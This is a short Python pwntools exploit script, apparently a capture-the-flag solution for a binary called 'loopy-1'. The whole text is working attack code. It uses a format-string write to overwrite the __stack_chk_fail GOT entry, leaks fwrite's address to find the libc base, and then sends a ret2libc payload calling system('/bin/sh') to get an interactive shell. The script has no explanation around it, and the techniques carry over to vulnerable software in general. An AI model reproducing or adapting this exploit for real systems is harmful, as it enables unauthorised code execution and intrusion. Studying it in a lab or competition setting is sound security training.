from pwn import *

elf = ELF("./loopy-1")
libc = ELF("./libc.so.6")

ret_addr = 0x804900a

p = process(elf.path)

p.recvuntil(b">")

buf = p32(elf.got['__stack_chk_fail'])
buf += b"%" +str(ret_addr - len(buf) ).encode() +b"c"
buf += b"%7$n"
buf += b"A" * (0x50 - len(buf))
buf += p32(elf.plt['printf'])
buf += p32(elf.symbols['main'])
buf += p32(elf.got['fwrite'])


print(buf)

p.sendline(buf)

p.recvuntil(b"You typed: ")
#p.recvuntil(b"A"*40)
p.recvuntil(p32(elf.got['fwrite']))
leak_fwrite_addr = u32(p.recv(4))
log.info("leak_fwrite_addr = " + hex(leak_fwrite_addr))
libc_base = leak_fwrite_addr - libc.symbols['fwrite'] 
log.info("libc_base = " + hex(libc_base))

buf = b"A" * 0x50
buf += p32(libc_base + libc.symbols['system'])
buf += b"B" * 4
buf += p32(libc_base + next(libc.search(b"/bin/sh")))
p.sendline(buf)

p.interactive()
